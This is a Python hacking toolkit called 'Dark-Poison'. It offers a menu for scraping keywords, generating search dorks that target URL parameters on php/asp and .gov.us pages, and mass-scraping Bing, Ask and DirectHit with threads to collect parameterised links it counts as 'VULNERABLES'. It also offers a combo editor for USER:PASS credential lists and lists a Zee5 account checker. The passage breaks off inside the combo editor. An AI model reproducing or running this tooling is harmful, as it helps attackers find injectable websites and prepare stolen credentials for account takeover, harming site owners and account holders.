import subprocess,os
try:
	import threading,requests,termcolor,time,random
	from bs4 import BeautifulSoup
except:
	os.system('pip install threading')
	os.system('pip install requests')
	os.system('pip install termcolor')
	os.system('pip install random')
	os.system('pip install bs4')
	import threading,requests,termcolor,time,random
	from bs4 import BeautifulSoup
import os.path
from termcolor import colored
from colorama import Fore,init
os.system('clear')
init()
try: os.chdir('Dark-Poison')
except:
	os.mkdir('Dark-Poison')
	os.chdir('Dark-Poison')
def logo():
	print(colored('''                                                                                                          
@@@@@@@    @@@@@@   @@@@@@@   @@@  @@@             @@@@@@@    @@@@@@   @@@   @@@@@@    @@@@@@   @@@  @@@  
@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@             @@@@@@@@  @@@@@@@@  @@@  @@@@@@@   @@@@@@@@  @@@@ @@@  
@@!  @@@  @@!  @@@  @@!  @@@  @@!  !@@             @@!  @@@  @@!  @@@  @@!  !@@       @@!  @@@  @@!@!@@@  
!@!  @!@  !@!  @!@  !@!  @!@  !@!  @!!             !@!  @!@  !@!  @!@  !@!  !@!       !@!  @!@  !@!!@!@!  
@!@  !@!  @!@!@!@!  @!@!!@!   @!@@!@!   @!@!@!@!@  @!@@!@!   @!@  !@!  !!@  !!@@!!    @!@  !@!  @!@ !!@!  
!@!  !!!  !!!@!!!!  !!@!@!    !!@!!!    !!!@!@!!!  !!@!!!    !@!  !!!  !!!   !!@!!!   !@!  !!!  !@!  !!!  
!!:  !!!  !!:  !!!  !!: :!!   !!: :!!              !!:       !!:  !!!  !!:       !:!  !!:  !!!  !!:  !!!  
:!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!             :!:       :!:  !:!  :!:      !:!   :!:  !:!  :!:  !:!  
 :::: ::  ::   :::  ::   :::   ::  :::              ::       ::::: ::   ::  :::: ::   ::::: ::   ::   ::  
:: :  :    :   : :   :   : :   :   :::              :         : :  :   :    :: : :     : :  :   ::    :   
                                                                                                          
                                                                                                        [ ^_^ ]  BY DARKIECRIF
                                                                                                        ''',color = 'magenta'))
logo()
def options(i,option):
	clr = ['red','green','yellow','blue','magenta','cyan', 'white']
	clr1 = random.choice(clr)
	print(colored(f'\n	[ {i} ] ---- [ + ]-----> {option}',color = clr1))
options("1","Keyword Scrapper")
options("2","Dork Generator")
options("3", "Dork Searcher")
options("4","Combo Editor")
options("5","Zee5 Checker")
stats = input(termcolor.colored('\nEnter Your Desired Choice = ',color = 'magenta'))
if stats == "1":
	keyword = input('\n Enter The Keyword = ')
	os.system('clear')
	p = ""
	def Scraper(keyword):
		global p
		p = requests.get(f"http://skrayp.com/search.php?keyword={keyword}").text
		p = p.replace('<li>','\n')
		p = p.replace('</li>','')
	Scraper(keyword)
	s = set()
	f = set()
	c = 0
	for i in range(int(p.count('\n'))):
		r = p.split('\n')[i]
		c+=1
		if c <= 13:
			f.add(r)
		s.add(r)
		print(colored(r,color = 'magenta'))
	for item in f:
		Scraper(item)
		for i in range(1,int(p.count('\n'))):
			r = p.split('\n')[i]
			s.add(r)
			print(colored(r,color = 'magenta'))
	print('\n')
	for item in s:
		w = open(f'{keyword}_Keywords.txt','a').write(item+'\n')
	print(colored(f'\n\nSenpai Got '+str(len(s))+f' Keywords And Saved in |{keyword}_Keywords.txt|',color = "green"))
elif stats == "2":
        os.system('clear')
        try:
                os.mkdir('DORK_presets')
        except:
                os.path.isdir('DORK_presets')
        #key
        try:
                os.mkdir('DORK_presets/Keywords')
        except:
                os.path.isdir('DORK_presets/Keywords')
        #pt
        try:
                os.mkdir('DORK_presets/PageTypes')
        except:
                os.path.isdir('DORK_presets/PageTypes')
        #pf
        try:
                os.mkdir('DORK_presets/PageFormats')
        except:
                os.path.isdir('DORK_presets/PageFormats')
        #sf
        try:
                os.mkdir('DORK_presets/SearchFunctions')
        except:
                os.path.isdir('DORK_presets/SearchFunctions')
        #de
        try:
                os.mkdir('DORK_presets/DomainExtensions')
        except:
                os.path.isdir('DORK_presets/DomainExtensions')
        try:
                f = open('DORK_presets/Keywords/preset1.txt')
        except:
                f= open("DORK_presets/Keywords/preset1.txt","w+")
                f.close()
        #pt
        try:
                g = open('DORK_presets/PageTypes/preset1.txt')
        except:
                g= open("DORK_presets/PageTypes/preset1.txt","w+").write('act=\nid=\ncatid=\nprodid=\nIdNoticia=\ncid=\np=\nidhijo=\npage=\ncat=\nteam=\n=\njojo=\ncat_id=\nsectionID=\npageId=\nitem=\nname=\nID=\nLID=')
                g.close
        #pf
        try:
                h = open('DORK_presets/PageFormats/preset1.txt')
        except:
                h= open("DORK_presets/PageFormats/preset1.txt","w+").write('php?\nhtml?\njsp?\nasp?')
                h.close
        try:
                i = open('DORK_presets/SearchFunctions/preset1.txt')
        except:
                i= open("DORK_presets/SearchFunctions/preset1.txt","w+").write('allinanchor:\ncache:\ninanchor:\nintext:\ninsubject:\nallintext:\ninfo:\nlink:\nfiletype:\nallintitle:\nallinurl:\nsource:\nintitle:\ninurl:')
                i.close
        try:
                j = open('DORK_presets/DomainExtensions/preset1.txt')
        except:
                j= open("DORK_presets/DomainExtensions/preset1.txt","w+").write('.us\n.gov.us\n.com\n.co')
                j.close
        print(colored('''
               ██████╗  ██████╗ ██████╗ ██╗  ██╗     ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗
                ██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
                ██║  ██║██║   ██║██████╔╝█████╔╝     ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
                ██║  ██║██║   ██║██╔══██╗██╔═██╗     ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
                ██████╔╝╚██████╔╝██║  ██║██║  ██╗    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
                ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝

                        POISON REAPER''',color = 'cyan'))
        def title(Status):
            pass
            # ctypes.windll.kernel32.SetConsoleTitleW(f" Dork Generator| {Status} | BLOOD REAPER")
        clear = lambda:os.system('clear')
        init(True)
        def OpenFileDialog(title):
            print("     {}Enter Your {} File Path [>] ".format(Fore.LIGHTGREEN_EX,title))
            file = input("\n [×^_^×] = ")
            try: filepath = open(file)
            except Exception as e:
                print(e)
                print('\n')
                filepath = ""
            if filepath == "":
                print("Choose file again.. ")
                OpenFileDialog(title)
            return filepath

        def Banner(Status):
            text = f"""

                ██████╗  ██████╗ ██████╗ ██╗  ██╗     ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗
                ██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
                ██║  ██║██║   ██║██████╔╝█████╔╝     ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
                ██║  ██║██║   ██║██╔══██╗██╔═██╗     ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
                ██████╔╝╚██████╔╝██║  ██║██║  ██╗    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
                ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝

                        POISON REAPER

                Status: {Status}


            """
            print(f"{Fore.LIGHTYELLOW_EX}{text}")
        byu = colored('\n\nHOW WOULD YOU LIKE TO GENERATE YOUR DORKS ?',color = 'red')
        print(byu)
        print(colored('\n\n[01] DEFAULT DROKS          [02] MAKE WITH YOUR DORKS',color = 'cyan'))
        byu2 = colored('\n\nPLEASE CHOOSE AN OPTION FROM THE ABOVE LIST = ',color = 'blue')
        bruh = int(input(byu2))
        while bruh not in [1,2]:
            bruh = int(input(byu2))
            continue
        if bruh == 1:
            from datetime import date, datetime
            now = datetime.now()
            now = str(now).split(".")[0]
            now = now.replace(":", "-")
            generate = 0
            empty = set()
            def generator(kwl,pfl,ptl,sfl,forml):
                global generate
                for kw in kwl:
                    kw = kw.replace("\n", "")
                    for pf in pfl:
                        pf = pf.replace("\n", "")
                        for pt in ptl:
                            pt = pt.replace("\n", "")
                            for sf in sfl:
                                sf = sf.replace("\n", "")
                                for form in forml:
                                    if len(kw.split(" ")) ==2:
                                        kw1 = kw.split(" ")[0]
                                        kw2 = kw.split(" ")[1]
                                        form = form.replace("(kw1)", kw1)
                                        form = form.replace("(kw3)", kw1)
                                        form = form.replace("(kw2)", kw2)
                                        form = form.replace("(pf)", pf)
                                        form = form.replace("(pt)", pt)
                                        form = form.replace("(sf)", sf)
                                        if form not  in empty:
                                            empty.add(form)
                                            generate+=1
                                            title(f"Generated: {generate}")
                                            print(form)
                                            f = open(f"Genrated[{now}].txt", "a")
                                            f.write(form+"\n")
                                            f.close()
                                    if len(kw.split(" ")) ==3:
                                        kw1 = kw.split(" ")[0]
                                        kw2 = kw.split(" ")[1]
                                        kw3 = kw.split(" ")[2]
                                        form = form.replace("(kw1)", kw1)
                                        form = form.replace("(kw2)", kw2)
                                        form = form.replace("(kw3)", kw3)
                                        form = form.replace("(pf)", pf)
                                        form = form.replace("(pt)", pt)
                                        form = form.replace("(sf)", sf)
                                        if form not  in empty:
                                            empty.add(form)
                                            generate+=1
                                            title(f"Generated: {generate}")
                                            print(form)
                                            f = open(f"Genrated[{now}].txt", "a")
                                            f.write(form+"\n")
                                            f.close()
                                    else:
                                        form = form.replace("(kw1)", kw)
                                        form = form.replace("(kw2)", kw)
                                        form = form.replace("(kw3)", kw)
                                        form = form.replace("(pf)", pf)
                                        form = form.replace("(pt)", pt)
                                        form = form.replace("(sf)", sf)
                                        print(form)
                                        if form not  in empty:
                                            empty.add(form)
                                            generate+=1
                                            title(f"Generated: {generate}")
                                            print(form)
                                            f = open(f"Genrated[{now}].txt", "a")
                                            f.write(form+"\n")
                                            f.close()
            forml= ["(kw1) +(kw2) ?(pt)= (sf):(kw3)",
                "(kw1) +(kw2) .(pf)?(pt)= (sf):(kw3)  ",
                "(kw1) +(kw2) .(kw3) ?(pt)= (sf): ",
                "(kw1) +(kw2) ?(kw3) = (sf): ",
                "(kw1) +(kw2) .(pf)?(kw3) = (sf): ",
                "(kw1) +(kw2) ?(kw3) %= (sf): ",
                "(kw1) +(kw2) ?(kw3) [(pt)]= (sf): ",
                "(kw1) +(kw2) .(kw3) ?(pt)= (sf): ",
                "(kw1) +(kw2) .(pf)?[(kw3)] (pt)= (sf): ",
                "(kw1) +(kw2) ?(kw3) %%= (sf): ",
                "(kw1) +(kw2) .(pf)?(kw3) %%= (sf): ",
                "(kw1) +(kw2) .(kw3) ?= (sf): ",
                "(kw1) +(kw2) ?(kw3) -= (sf): ",
                "(kw1) +(kw2) .(pf)?(kw3) -= (sf): ",
                "(kw1) +(kw2) .(pf)?(kw3) %= (sf): ",
                "(kw1) +(kw2) .(kw3) ?%%= (sf): ",
                "(kw1) +(kw2) .(pf)?(kw3) .(pt)= (sf): ",
                "(kw1) +(kw2) .(kw3) ?-= (sf): ",
                "(kw1) +(kw2) .(kw3) ?%= (sf): ",
                "(kw1) +(kw2) .(kw3) ?%%= (sf): ",
                "(kw1) +(kw2) .(kw3) ?.(pt)= (sf):"]
            title("Status: Load file Please")
            os.system('clear')
            Banner("Input")
            kwl = OpenFileDialog("Keyword").readlines()
            pfl = open("DORK_presets/PageFormats/preset1.txt").readlines()
            ptl = open("DORK_presets/PageTypes/preset1.txt").readlines()
            sfl = open("DORK_presets/SearchFunctions/preset1.txt").readlines()
            clear()
            Banner("Generating")
            time.sleep(5)
            generator(kwl, pfl, ptl, sfl, forml)

            input(f"Generated {generate} dorks\n")
        elif bruh == 2:
            from datetime import date, datetime
            now = datetime.now()
            now = str(now).split(".")[0]
            now = now.replace(":", "-")
            generate = 0
            empty = set()
            def generator(kwl,pfl,ptl,sfl,de,forml):
                global generate
                for kw in kwl:
                    kw = kw.replace("\n", "")
                    for pf in pfl:
                        pf = pf.replace("\n", "")
                        for pt in ptl:
                            pt = pt.replace("\n", "")
                            for sf in sfl:
                                sf = sf.replace("\n", "")
                                for domain in de:
                                        domain = domain.replace("\n","")
                                        for dp in forml:
                                                dp = dp.replace("\n", "")
                                                for form in forml:
                                                        if len(kw.split(" ")) ==2:
                                                                kw1 = kw.split(" ")[0]
                                                                kw2 = kw.split(" ")[1]
                                                                form = form.replace("(kw1)", kw1)
                                                                form = form.replace("(kw3)", kw1)
                                                                form = form.replace("(kw2)", kw2)
                                                                form = form.replace("(pf)", pf)
                                                                form = form.replace("(pt)", pt)
                                                                form = form.replace("(sf)", sf)
                                                                form = form.replace("(de)",domain)
                                                                if form not  in empty:
                                                                  empty.add(form)
                                                                  generate+=1
                                                                  title(f"Generated: {generate}")
                                                                  print(form)
                                                                  f = open(f"Genrated[{now}].txt", "a")
                                                                  f.write(form+"\n")
                                                                  f.close()
                                                        if len(kw.split(" ")) ==3:
                                                                kw1 = kw.split(" ")[0]
                                                                kw2 = kw.split(" ")[1]
                                                                kw3 = kw.split(" ")[2]
                                                                form = form.replace("(kw1)", kw1)
                                                                form = form.replace("(kw2)", kw2)
                                                                form = form.replace("(kw3)", kw3)
                                                                form = form.replace("(pf)", pf)
                                                                form = form.replace("(pt)", pt)
                                                                form = form.replace("(sf)", sf)
                                                                form = form.replace('(de)',domain)
                                                                if form not  in empty:
                                                                  empty.add(form)
                                                                  generate+=1
                                                                  title(f"Generated: {generate}")
                                                                  print(form)
                                                                  f = open(f"Genrated[{now}].txt", "a")
                                                                  f.write(form+"\n")
                                                                  f.close()
                                                        else:
                                                                form = form.replace("(kw1)", kw)
                                                                form = form.replace("(kw2)", kw)
                                                                form = form.replace("(kw3)", kw)
                                                                form = form.replace("(pf)", pf)
                                                                form = form.replace("(pt)", pt)
                                                                form = form.replace("(sf)", sf)
                                                                form = form.replace("(de)",domain)
                                                                print(form)
                                                                if form not  in empty:
                                                                  empty.add(form)
                                                                  generate+=1
                                                                  title(f"Generated: {generate}")
                                                                  print(form)
                                                                  f = open(f"Genrated[{now}].txt", "a")
                                                                  f.write(form+"\n")
                                                                  f.close()
            '''
            #forml= ["(kw1) +(kw2) ?(pt)= (sf):(kw3)",
            #   "(kw1) +(kw2) .(pf)?(pt)= (sf):(kw3)  ",
                "(kw1) +(kw2) .(kw3) ?(pt)= (sf): ",
                "(kw1) +(kw2) ?(kw3) = (sf): ",
                "(kw1) +(kw2) .(pf)?(kw3) = (sf): ",
                "(kw1) +(kw2) ?(kw3) %= (sf): ",
                "(kw1) +(kw2) ?(kw3) [(pt)]= (sf): ",
                "(kw1) +(kw2) .(kw3) ?(pt)= (sf): ",
                "(kw1) +(kw2) .(pf)?[(kw3)] (pt)= (sf): ",
                "(kw1) +(kw2) ?(kw3) %%= (sf): ",
                "(kw1) +(kw2) .(pf)?(kw3) %%= (sf): ",
                "(kw1) +(kw2) .(kw3) ?= (sf): ",
                "(kw1) +(kw2) ?(kw3) -= (sf): ",
                "(kw1) +(kw2) .(pf)?(kw3) -= (sf): ",
                "(kw1) +(kw2) .(pf)?(kw3) %= (sf): ",
                "(kw1) +(kw2) .(kw3) ?%%= (sf): ",
                "(kw1) +(kw2) .(pf)?(kw3) .(pt)= (sf): ",
                "(kw1) +(kw2) .(kw3) ?-= (sf): ",
                "(kw1) +(kw2) .(kw3) ?%= (sf): ",
                "(kw1) +(kw2) .(kw3) ?%%= (sf): ",
                "(kw1) +(kw2) .(kw3) ?.(pt)= (sf):"]
            '''
            title("Status: Load file Please")
            os.system('clear')
            Banner("Input")
            kwl = OpenFileDialog("Keyword").readlines()
            pfl = OpenFileDialog("Page Formats").readlines()
            ptl = OpenFileDialog("Page Types").readlines()
            sfl = OpenFileDialog("Search Functions").readlines()
            forml = OpenFileDialog("Dork Pattern").readlines()
            de = open('DORK_presets/DomainExtensions/preset1.txt').readlines()
            clear()
            Banner("Generating")
            time.sleep(5)
            generator(kwl, pfl, ptl, sfl, de, forml)

            input(f"Generated {generate} dorks\n")
elif stats == "3":
        os.system('clear')
        logo()
        print('\n')
        options('1','Bing')
        options('2','Ask')
        options('3', 'DirectHit')
        Invulnerable = list(set())
        def dorkers():
        	engine = input(termcolor.colored('\n     Enter Your Servive Serial Number = ',color = 'cyan'))
        	if int(engine) >= 4:
        		print(termcolor.colored('\n Error 404: Servive Engine Not Found !',color = 'red'))
        		exit()
        	try:
        		os.chdir('Results')
        	except:
        		os.mkdir('Results')
        		os.chdir('Results')
        	logo = '''

    ▓█████▄  ▒█████   ██▀███   ██ ▄█▀▓█████  ██▀███    ██████ 
    ▒██▀ ██▌▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒▒██    ▒ 
    ░██   █▌▒██░  ██▒▓██ ░▄█ ▒▓███▄░ ▒███   ▓██ ░▄█ ▒░ ▓██▄   
    ░▓█▄   ▌▒██   ██░▒██▀▀█▄  ▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒
    ░▒████▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄░▒████▒░██▓ ▒██▒▒██████▒▒
     ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░
     ░ ▒  ▒   ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░
     ░ ░  ░ ░ ░ ░ ▒    ░░   ░ ░ ░░ ░    ░     ░░   ░ ░  ░  ░  
       ░        ░ ░     ░     ░  ░      ░  ░   ░           ░  
     ░                                                        
                 BY TEAM RADOX × DARKIECRIF
                 '''
        	os.system('clear')
        	print(Fore.RED+logo)
        	input('\n\nPress Enter To Start')
        	headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36'}
        	print(Fore.GREEN+"\n	Load Dorks File")
        	file = input('\n ENTER THE PATH OF THE DORKS FILE = ')
        	dorksfile = open(file, "r", encoding ='utf-8', errors='ignore').readlines()
        	Interface = input('\n DO YOU WANT TO USE LIVE COUNT INTERFACE ? (Y/N) = ').lower()
        	if Interface == 'y':
        		Interface = 1
        	else: Interface = 0
        	if int(engine) == 1:
        		print('\n    Starting Searching With Bing ^_^')
        	elif int(engine) == 2:
        		print('\n    Starting Searching With Ask^_^')
        	else: print('\n    Starting Searching With DirectHit ^_^')
        	datas = []
        	Checked = 0
        	Total = len(dorksfile)
        	def clrd(st,ct,cl): print(termcolor.colored(f'{st} = {ct}',color = cl))
        	def rishabpro(html):
        		global invulnerables
        		data = []
        		parse_html = BeautifulSoup(html, 'html.parser')
        		links = parse_html.find_all('a')
        		for link in links:
        		  link = link.get('href')
        		  try:
        		          if "http" in link and "www.netflix.com/" not in link and "?" in link and "=" in link and "www.bing.com" not in link and "www.ask.com" not in link and "go.microsoft.com" not in link and "wikipedia.org" not in link and "www.imdb.com" not in link and "www.pinterest.com" not in link and "www.maps.google" not in link and ".pdf" not in link and not "www.youtube.com" in link and "www.facebook.com" not in link and "www.instagram.com" not in link and "http://www.google." not in link and "www.paypal.com" not in link and '/search?q=' not in link and link not in datas:
        		          	datas.append(link)
        		          	data.append(link)
        		          else:
        		          	if "http" in link and "=" not in link:
        		          		Invulnerable.append(link)
        		  except:
        		  	continue
        		return data
        	def check_page_1(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(1)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=1'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=1'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		
        	def check_page_2(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(11)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=2'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=2'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		
        	def check_page_3(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(21)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=3'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=3'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		
        	def check_page_4(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(31)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=4'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=4'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		

        	def check_page_5(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(41)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=5'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=5'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		

        	def check_page_6(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(51)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=6'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=6'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		

        	def check_page_7(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(61)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=7'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=7'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		

        	def check_page_8(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(71)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=8'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=8'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		

        	def check_page_9(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(81)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=9'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=9'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		
        	def check_page_10(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(91)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=10'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=10'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		
        	def check_page_11(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(101)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=11'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=11'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		
        	def check_page_12(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(111)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=12'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=12'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		
        	def check_page_13(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(121)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=13'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=13'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		
        	def check_page_14(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(131)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=14'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=14'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		
        	def check_page_15(dork):
        		if int(engine) == 1:
        			url = 'https://www.bing.com/search?q='+dork+'&first='+str(141)
        		elif int(engine) == 2:
        			url = f'https://www.ask.com/web?q={dork}&page=15'
        		else: url = f'https://www.directhit.com/web?o=0&q={dork}&page=15'
        		res = requests.get(url, headers=headers)
        		links = rishabpro(res.text)
        		save = open("Links.txt", 'a')
        		for items in links:
        		  	if Interface == 0: print(items)
        		  	save.write(items + '\n')	
        		
        	for dork in dorksfile:
        		t1 = threading.Thread(target=check_page_1, args=(dork,))
        		t2 = threading.Thread(target=check_page_2, args=(dork,))
        		t3 = threading.Thread(target=check_page_3, args=(dork,))
        		t4 = threading.Thread(target=check_page_4, args=(dork,))
        		t5 = threading.Thread(target=check_page_5, args=(dork,))
        		t6 = threading.Thread(target=check_page_6, args=(dork,))
        		t7 = threading.Thread(target=check_page_7, args=(dork,))
        		t8 = threading.Thread(target=check_page_8, args=(dork,))
        		t9 = threading.Thread(target=check_page_9, args=(dork,))
        		t10 = threading.Thread(target=check_page_10, args=(dork,))
        		t11 = threading.Thread(target=check_page_11, args=(dork,))
        		t12 = threading.Thread(target=check_page_12, args=(dork,))
        		t13 = threading.Thread(target=check_page_13, args=(dork,))
        		t14 = threading.Thread(target=check_page_14, args=(dork,))
        		t15 = threading.Thread(target=check_page_15, args=(dork,))
        		t1.start()
        		t2.start()
        		t3.start()
        		t4.start()
        		t5.start()
        		t6.start()
        		t7.start()
        		t8.start()
        		t9.start()
        		t10.start()
        		t11.start()
        		t12.start()
        		t13.start()
        		t14.start()
        		t15.start()
        		t1.join()
        		t2.join()
        		t3.join()
        		t4.join()
        		t5.join()
        		t6.join()
        		t7.join()
        		t8.join()
        		t9.join()
        		t10.join()
        		t11.join()
        		t12.join()
        		t13.join()
        		t14.join()
        		t15.join()
        		Checked +=1
        		Vulnerables = len(datas)
        		Invulnerables = len(Invulnerable)
        		Total_Links = Vulnerables+Invulnerables
        		if Interface == 0: print('Dork Checked: '+dork)
        		else:
        			os.system('clear')
        			print(Fore.RED+logo)
        			clrd('\n	TOTAL DORKS',Total,'cyan')
        			clrd('\n	TOTAL LINKS',Total_Links,'magenta')
        			clrd('\n	VULNERABLES',Vulnerables,'green')
        			clrd('\n	INVULNERABLES',Invulnerables,'red')
        			clrd('\n	DORKS CHECKED',Checked,'white')
        	input('\nCompleted Searching Press Any key to Exit!')
        dorkers()
elif stats ==  "4":
	try: os.chdir('Combo Editor')
	except:
		os.mkdir('Combo Editor')
		os.chdir('Combo Editor')
	frsh = open('Combo_Editor.txt','w+')
	frsh.close()
	os.system('clear')
	logo()
	print(colored('\n'))
	options("1", "Lower Case All Characters")
	options("2", "Upper Case All Characters")
	options("3", "<USER>:<PASS> Combo To <PASS>:<USER>")
	options("4", "<USER>:<PASS> Combo To Leads")
	options("5", "USER:PASS Combo To <EMAIL>:<PASS>")
	options("6", "Domains Sorter [Emails]")
	Combu = input(colored('\n	Enter The Module Number = '))
	if Combu == "1":
		huit = input(termcolor.colored('\n     Enter The Combo File Path = ',color = 'blue'))
		pth = open(huit).readlines()
		for line in pth:
			line = line.replace('\n','')
			line = line.lower()
